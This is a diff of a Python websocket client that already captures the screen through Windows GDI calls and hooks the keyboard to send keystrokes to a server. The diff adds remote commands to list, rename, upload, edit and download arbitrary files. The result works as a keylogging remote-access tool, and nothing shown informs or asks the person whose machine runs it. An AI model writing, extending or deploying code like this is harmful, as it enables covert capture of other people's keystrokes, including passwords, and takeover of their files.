@@ -12,17 +12,17 @@ from struct import pack, calcsize, unpack
 import json
 import ctypes
 import lzma
-import gzip
+import platform
 
-
-GetWindowDC = ctypes.windll.user32.GetWindowDC
-GetSystemMetrics = ctypes.windll.user32.GetSystemMetrics
-SelectObject = ctypes.windll.gdi32.SelectObject
-DeleteObject = ctypes.windll.gdi32.DeleteObject
-BitBlt = ctypes.windll.gdi32.BitBlt
-GetDIBits = ctypes.windll.gdi32.GetDIBits
-CreateCompatibleDC = ctypes.windll.gdi32.CreateCompatibleDC
-CreateCompatibleBitmap = ctypes.windll.gdi32.CreateCompatibleBitmap
+if platform.system().lower() == 'windows':
+    GetWindowDC = ctypes.windll.user32.GetWindowDC
+    GetSystemMetrics = ctypes.windll.user32.GetSystemMetrics
+    SelectObject = ctypes.windll.gdi32.SelectObject
+    DeleteObject = ctypes.windll.gdi32.DeleteObject
+    BitBlt = ctypes.windll.gdi32.BitBlt
+    GetDIBits = ctypes.windll.gdi32.GetDIBits
+    CreateCompatibleDC = ctypes.windll.gdi32.CreateCompatibleDC
+    CreateCompatibleBitmap = ctypes.windll.gdi32.CreateCompatibleBitmap
 
 
 class Data:
@@ -46,18 +46,48 @@ class File:
         pass
 
     @staticmethod
+    def rename(src, dst):
+        os.rename(src, dst)
+        return {"msg": "success"}
+
+    @staticmethod
+    def download(path):
+        with open(path, 'rb') as f:
+            return f.read()
+
+    @staticmethod
+    def edit(path, data):
+        if data:
+            with open(path, "w", encoding="utf8") as f:
+                f.write(data)
+                return {"msg": "success"}
+        else:
+            with open(path, "r", encoding="utf8") as f:
+                return {"msg": "success", "data": f.read()}
+
+    @staticmethod
+    def save_file(path: str, data: bytes):
+        with open(path, 'wb') as f:
+            f.write(data)
+        return {"msg": "success"}
+
+    @staticmethod
     def dir(path):
         _dir = []
-        for filename in os.listdir(path):
-            full_path = os.path.join(path, filename)
-            dirname = os.path.dirname(os.path.join(path, filename))
-            mtime = os.path.getmtime(full_path)*1000
-            atime = os.path.getatime(full_path)*1000
-            ctime = os.path.getctime(full_path)*1000
-            file_size = os.path.getsize(full_path)
-            file_abspath = os.path.abspath(full_path)
-            _dir.append({"filename": filename, "file_type": os.path.isdir(full_path), "mtime": mtime, "file_size": file_size, "file_abspath": file_abspath, "atime": atime, "ctime": ctime, "dirname": dirname})
-        return _dir
+        try:
+            for filename in os.listdir(path):
+                full_path = os.path.join(path, filename)
+                dirname = os.path.dirname(os.path.join(path, filename))
+                last_dirname = os.path.realpath(os.path.dirname(os.path.join(dirname, "../")))
+                mtime = os.path.getmtime(full_path) * 1000
+                atime = os.path.getatime(full_path) * 1000
+                ctime = os.path.getctime(full_path) * 1000
+                file_size = os.path.getsize(full_path)
+                file_abspath = os.path.abspath(full_path)
+                _dir.append({"filename": filename, "file_type": os.path.isdir(full_path), "mtime": mtime,"file_size": file_size,"file_abspath": file_abspath, "atime": atime, "ctime": ctime, "dirname": dirname, "last_dirname": last_dirname})
+            return _dir
+        except Exception as e:
+            return _dir
 
 
 class Client:
@@ -98,6 +128,21 @@ class Client:
             self.send(data_bean.json())
         if msg.get("type") == "dir":
             data_bean.raw = File.dir(msg["data"])
+            self.send(data_bean.json())
+        if msg.get("type") == "rename":
+            raw_data = msg["data"]
+            data_bean.raw = File.rename(raw_data["file_abspath"], os.path.join(raw_data["dirname"], raw_data["rename"]))
+            self.send(data_bean.json())
+        if msg.get("type") == "upload":
+            raw_path = msg["data"]["path"]
+            data_bean.raw = File.save_file(raw_path, base64.b64decode(msg["data"]["data"]))
+            self.send(data_bean.json())
+        if msg.get("type") == "edit":
+            raw_path = msg["data"]["path"]
+            data_bean.raw = File.edit(raw_path, msg["data"].get("data"))
+            self.send(data_bean.json())
+        if msg.get("type") == "download":
+            data_bean.data = File.download(msg["data"]["file_abspath"])
             self.send(data_bean.json())
 
     def on_open(self):
@@ -163,6 +208,7 @@ class Client:
 
 
 if __name__ == '__main__':
-    client = Client("ws://127.0.0.1:5000/ping")
+    WS_URL = "ws://127.0.0.1:5000/ping"
+    client = Client(WS_URL)
     keyboard.hook(client.key)
     client.ws.run_forever(ping_interval=10)
